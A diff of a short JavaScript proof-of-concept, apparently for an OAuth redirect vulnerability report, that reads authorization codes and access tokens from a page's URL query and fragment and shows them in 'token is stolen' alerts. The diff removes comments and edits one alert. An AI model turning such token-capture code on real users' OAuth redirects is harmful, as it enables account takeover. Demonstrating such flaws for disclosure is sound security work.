@@ -1,19 +1,16 @@
 <script>
     try {
-        // Extract URL parameters
         var urlParams = new URLSearchParams(window.location.search);
         var codeValue = urlParams.get('code');
         var codeValue2 = urlParams.get('privy_oauth_code');
 
-        // Check and alert if code values exist
         if (codeValue) {
             alert('Your token is stolen: ' + codeValue);
         }
         if (codeValue2) {
             alert('Your token is stolen: ' + codeValue2);
         }
-
-        // Extract fragment parameters (after #)
+        
         var urlp = {};
         var s = location.toString().split('#')[1];
 
@@ -23,10 +20,9 @@
                 var u = s[i].split('=');
                 urlp[u[0]] = u[1];
             }
-
-            // Check and alert if access_token exists
+       
             if (urlp['access_token']) {
-                alert('Victim Token: ' + urlp['access_token']);
+                alert('VICTIM ACCESS TOKEN: ' + urlp['access_token']);
             }
         }
     } catch (error) {
